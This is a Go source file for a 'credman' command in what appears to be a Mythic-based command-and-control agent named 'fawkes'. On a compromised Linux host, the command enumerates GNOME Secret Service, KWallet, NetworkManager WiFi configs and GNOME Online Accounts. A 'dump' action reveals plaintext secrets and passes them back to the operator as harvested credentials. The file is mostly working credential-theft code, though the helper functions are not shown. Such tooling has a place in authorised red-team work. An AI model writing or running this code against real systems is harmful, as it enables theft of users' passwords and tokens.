//go:build linux

package commands

import (
	"encoding/json"
	"fmt"
	"sort"
	"strings"

	"fawkes/pkg/structs"
)

type CredmanCommand struct{}

func (c *CredmanCommand) Name() string        { return "credman" }
func (c *CredmanCommand) Description() string { return "Enumerate Linux credential stores (keyrings, WiFi passwords, token files)" }

type credmanArgs struct {
	Action string `json:"action"`
	Filter string `json:"filter"`
}

func (c *CredmanCommand) Execute(task structs.Task) structs.CommandResult {
	var args credmanArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			args.Filter = strings.TrimSpace(task.Params)
		}
	}
	if args.Action == "" {
		args.Action = "list"
	}

	switch strings.ToLower(args.Action) {
	case "list":
		return credmanLinuxList(args, false)
	case "dump":
		return credmanLinuxList(args, true)
	default:
		return errorf("Unknown action: %s. Use: list or dump (vault is Windows-only; use 'keychain' on macOS)", args.Action)
	}
}

type linuxCredEntry struct {
	Source   string
	Label   string
	Account string
	Secret  string
	Attrs   map[string]string
}

func credmanLinuxList(args credmanArgs, showSecrets bool) structs.CommandResult {
	var allCreds []linuxCredEntry
	var sections []string

	gnomeCreds, gnomeErr := enumerateSecretService(showSecrets)
	if gnomeErr != "" {
		sections = append(sections, fmt.Sprintf("[Secret Service] %s", gnomeErr))
	} else {
		allCreds = append(allCreds, gnomeCreds...)
	}

	kwalletCreds, kwalletErr := enumerateKWallet(showSecrets)
	if kwalletErr != "" {
		sections = append(sections, fmt.Sprintf("[KWallet] %s", kwalletErr))
	} else {
		allCreds = append(allCreds, kwalletCreds...)
	}

	nmCreds, nmErr := enumerateNetworkManager()
	if nmErr != "" {
		sections = append(sections, fmt.Sprintf("[NetworkManager] %s", nmErr))
	} else {
		allCreds = append(allCreds, nmCreds...)
	}

	goaCreds := enumerateGNOMEOnlineAccounts()
	allCreds = append(allCreds, goaCreds...)

	if args.Filter != "" {
		allCreds = filterCredEntries(allCreds, args.Filter)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Linux Credential Stores (%d entries) ===\n\n", len(allCreds)))

	var mythicCreds []structs.MythicCredential
	bySource := groupBySource(allCreds)
	sourceOrder := []string{"Secret Service", "KWallet", "NetworkManager", "GNOME Online Accounts"}
	for _, src := range sourceOrder {
		entries, ok := bySource[src]
		if !ok || len(entries) == 0 {
			continue
		}
		sb.WriteString(fmt.Sprintf("--- %s (%d entries) ---\n", src, len(entries)))
		for _, e := range entries {
			sb.WriteString(fmt.Sprintf("  Label:   %s\n", e.Label))
			if e.Account != "" {
				sb.WriteString(fmt.Sprintf("  Account: %s\n", e.Account))
			}
			if showSecrets && e.Secret != "" {
				sb.WriteString(fmt.Sprintf("  Secret:  %s\n", e.Secret))
			} else if e.Secret != "" {
				sb.WriteString("  Secret:  [use -action dump to reveal]\n")
			}
			for k, v := range e.Attrs {
				sb.WriteString(fmt.Sprintf("  %s: %s\n", k, v))
			}
			sb.WriteString("\n")

			if e.Account != "" {
				credType := "plaintext"
				credValue := e.Secret
				if !showSecrets || credValue == "" {
					credType = "plaintext"
					credValue = fmt.Sprintf("[%s credential]", src)
				}
				mythicCreds = append(mythicCreds, structs.MythicCredential{
					CredentialType: credType,
					Realm:          e.Label,
					Account:        e.Account,
					Credential:     credValue,
					Comment:        fmt.Sprintf("credman %s (%s)", args.Action, src),
				})
			}
		}
	}

	if len(sections) > 0 {
		sb.WriteString("--- Notes ---\n")
		for _, s := range sections {
			sb.WriteString(fmt.Sprintf("  %s\n", s))
		}
	}

	if len(allCreds) == 0 && len(sections) == 0 {
		sb.WriteString("No credentials found. Ensure a keyring daemon (gnome-keyring-daemon, kwalletd) is running, or check NetworkManager configs in /etc/NetworkManager/system-connections/.\n")
	}

	result := structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
	if len(mythicCreds) > 0 {
		result.Credentials = &mythicCreds
	}
	for i := range allCreds {
		structs.ZeroString(&allCreds[i].Secret)
	}
	return result
}

func filterCredEntries(entries []linuxCredEntry, filter string) []linuxCredEntry {
	filter = strings.ToLower(filter)
	hasWildcard := strings.Contains(filter, "*")
	var filtered []linuxCredEntry
	for _, e := range entries {
		target := strings.ToLower(e.Label + " " + e.Account)
		if hasWildcard {
			pattern := strings.ReplaceAll(filter, "*", "")
			if strings.Contains(target, pattern) {
				filtered = append(filtered, e)
			}
		} else if strings.Contains(target, filter) {
			filtered = append(filtered, e)
		}
	}
	return filtered
}

func groupBySource(entries []linuxCredEntry) map[string][]linuxCredEntry {
	m := make(map[string][]linuxCredEntry)
	for _, e := range entries {
		m[e.Source] = append(m[e.Source], e)
	}
	for _, v := range m {
		sort.Slice(v, func(i, j int) bool { return v[i].Label < v[j].Label })
	}
	return m
}
